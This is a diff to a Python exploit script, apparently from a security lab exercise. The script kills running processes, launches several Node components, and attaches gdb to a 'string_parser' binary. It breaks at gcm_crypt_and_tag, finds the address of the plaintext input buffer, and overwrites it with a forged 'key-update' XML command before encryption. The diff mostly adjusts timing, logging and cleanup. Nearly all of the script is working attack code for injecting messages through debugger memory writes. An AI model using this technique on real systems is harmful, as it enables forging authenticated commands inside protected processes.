@@ -22,14 +22,14 @@ def cleanUp():
 
 def setup() -> subprocess.Popen:
     os.system("pkill -9 gdb")
-    os.system("pkill -9 node")
     os.system("pkill -9 string_parser")
+    sleep(1)
     #  Ensure that you start M, P and SP before starting RP to guarantee correct operation
     M = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}manager"])
     to_kill.append(M.pid)
     P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"])
     to_kill.append(P.pid)
-    sleep(1)
+    sleep(2)
     SP = subprocess.Popen(["gdb", f"{path}string_parser"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
     #SP = subprocess.Popen([f"{path}string_parser"], stdin=subprocess.PIPE)
     to_kill.append(SP.pid)
@@ -39,33 +39,40 @@ def setup() -> subprocess.Popen:
 def run1():
     SP = setup()
     # Exploit
+    SP.stdin.write(b'set pagination off\n')
     SP.stdin.write(b'set follow-fork-mode child\n')
     SP.stdin.write(b'b* gcm_crypt_and_tag\n')
     SP.stdin.write(b'r\n')
     SP.stdin.flush()
-    sleep(1)
+    sleep(3)
     RP = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}remote_party"])
     to_kill.append(RP.pid)
+    sleep(2)
     # get the info
-    info = b""
-    while b"input=0x518" not in info:
-        info = SP.stdout.readline()
-    print(f"Found input=0x518, lets go on.")
     SP.stdin.write(b'c\n')
     SP.stdin.flush()
+    info = ""
+    while "input=0x518" not in info:
+        info = SP.stdout.readline().decode().rstrip()
+        print(f'SP<{info}')
+    print(f"Found input=0x518, lets go on.")
     
     info = ""
     while "input=0x7ff" not in info:
-        info = SP.stdout.readline().decode()
+        info = SP.stdout.readline().decode().rstrip()
+        print(f'SP2<{info}')
     regex = r"input=(0x[0-9a-f]*) "
     addr = re.findall(regex, info, re.MULTILINE)[0]
     print(f"Found input addr at {addr}")
-    to_write = f'set {{char[42]}}{addr} = "<mes><action type=\\"key-update\\"/></mes>"\n'.encode()
+    to_write = f'set {{char[40]}}{addr} = "<mes><action type=\\"key-update\\"/></mes>"\n'.encode()
     SP.stdin.write(to_write)
     SP.stdin.write(f'x /s {addr}\n'.encode())
     SP.stdin.write(b'c\n')
     SP.stdin.flush()
-    
+    info = ""
+    while "0x7ff" not in info:
+        info = SP.stdout.readline().decode().rstrip()
+        print(f'SP2<{info}')
     SP.stdin.close()
     SP.stdout.close()
     sleep(2)
@@ -93,6 +100,8 @@ def run2():
     SP.stdin.write(b'c\n')
     SP.stdin.flush()
     #code.interact(local=locals())
+    SP.stdin.close()
+    SP.stdout.close()
     sleep(15)
 
 def main():
@@ -100,7 +109,7 @@ def main():
         run1()
     except:
         pass
-    run2()
+    #run2()
 
 if __name__ == "__main__":
     try:
@@ -108,5 +117,5 @@ if __name__ == "__main__":
     except Exception as e:
         print(e)
         print(f"An error occured in main!")
-    #finally:
-    #    cleanUp()
+    finally:
+        cleanUp()
